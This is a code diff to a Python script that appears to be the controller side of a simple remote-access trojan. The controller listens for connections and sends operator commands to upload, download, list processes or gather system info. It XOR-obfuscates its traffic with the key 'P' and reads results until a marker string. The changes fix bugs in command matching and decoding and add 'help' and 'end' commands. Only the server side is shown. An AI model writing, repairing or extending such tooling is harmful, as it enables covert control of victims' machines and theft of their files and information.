@@ -11,19 +11,21 @@ options = """
 
 Commands:
 
+help
 upload
 download
 processes
 systeminfo
+end
 
 """
 
-OPTIONS = ["upload", "download", "systeminfo", "processes"] #available commands
+OPTIONS = ["upload", "download", "systeminfo", "processes", "help", "end"] #available commands
 
 def xor(message):
     newMessage = "" # init empty string
     for char in message:
-        deChar = ord(char) ^ ord('P') # compute xor for ascii value of char and the heart <3
+        deChar = ord(str(char)) ^ ord('P') # compute xor for ascii value of char and P
         newMessage += str(chr(deChar)) # append to new newMessage
     return str.encode(newMessage) # return result
 
@@ -33,6 +35,7 @@ while True:
     print ('Connection from ' + str(addr))
 
     while True: #beggining of accepting input
+        print(options)
         userInput = input(">> ")
         if userInput not in OPTIONS: #validate user input
             print(f"\n'{userInput}' is not a valid option.\n")
@@ -68,7 +71,7 @@ while True:
                 
             conn.recv(1024) # get confirmation if file was recieved
         
-        elif "download" in userInput.lower():
+        elif userInput.lower() == "download" :
             # syntax: download /remote/path    client/file/path    local/file/path
             # file will go to server's current working directory
             
@@ -130,7 +133,7 @@ while True:
             f.close() # close destination file
             '''
             break
-        elif "systeminfo" or "processes" in userInput.lower():
+        elif userInput.lower() == "systeminfo" or userInput.lower() == "processes":
             userInput = xor(userInput)
             conn.sendall(userInput)
             recv = conn.recv(1024)
@@ -138,5 +141,7 @@ while True:
             while "gettfouttahereistfg" not in message: # continue receiving and decrypting messages until a specific marker is hit
                 print(message)
                 rec = conn.recv(1024)
-                message = xor(rec)
+                message = xor(rec.decode())
+        elif "help" in userInput.lower():
+            print(options)
             
